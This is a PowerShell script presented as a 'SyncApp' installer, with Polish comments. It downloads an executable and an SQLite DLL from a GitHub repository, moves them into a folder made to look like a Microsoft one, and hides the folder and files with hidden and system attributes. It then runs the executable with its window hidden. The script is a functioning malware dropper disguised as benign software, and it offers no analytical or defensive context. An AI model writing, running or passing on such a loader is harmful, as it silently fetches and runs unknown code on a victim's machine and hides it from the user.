# SyncApp Multi-Stage Installer
$tempDir = "$env:LOCALAPPDATA\Microsoft\Windows\Shell"
$finalDir = "$env:LOCALAPPDATA\Microsoft\VaultDataSync"

$exeName = "WindowsDataSync.exe"
$dllName = "e_sqlite3.dll"

# 1. Przygotuj foldery
if (!(Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
if (!(Test-Path $finalDir)) { New-Item -ItemType Directory -Path $finalDir -Force | Out-Null }

# 2. Pobierz do Shell (Tymczasowo)
$urlExe = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/SyncApp.exe"
$urlDll = "https://github.com/cusXD/ADVBGHSAIYiasuihduiAJKH/raw/refs/heads/main/e_sqlite3.dll"

Write-Host "Inicjalizacja..."
try {
    Invoke-WebRequest -Uri $urlExe -OutFile (Join-Path $tempDir $exeName) -ErrorAction Stop
    Invoke-WebRequest -Uri $urlDll -OutFile (Join-Path $tempDir $dllName) -ErrorAction Stop
} catch {
    (New-Object Net.WebClient).DownloadFile($urlExe, (Join-Path $tempDir $exeName))
    (New-Object Net.WebClient).DownloadFile($urlDll, (Join-Path $tempDir $dllName))
}

# 3. Przenieś do VaultDataSync i ukryj
Move-Item -Path (Join-Path $tempDir $exeName) -Destination (Join-Path $finalDir $exeName) -Force
Move-Item -Path (Join-Path $tempDir $dllName) -Destination (Join-Path $finalDir $dllName) -Force

attrib +h +s $finalDir
attrib +h +s (Join-Path $finalDir $exeName)
attrib +h +s (Join-Path $finalDir $dllName)

# 4. Uruchom
if (Test-Path (Join-Path $finalDir $exeName)) {
    Start-Process -FilePath (Join-Path $finalDir $exeName) -WindowStyle Hidden
}
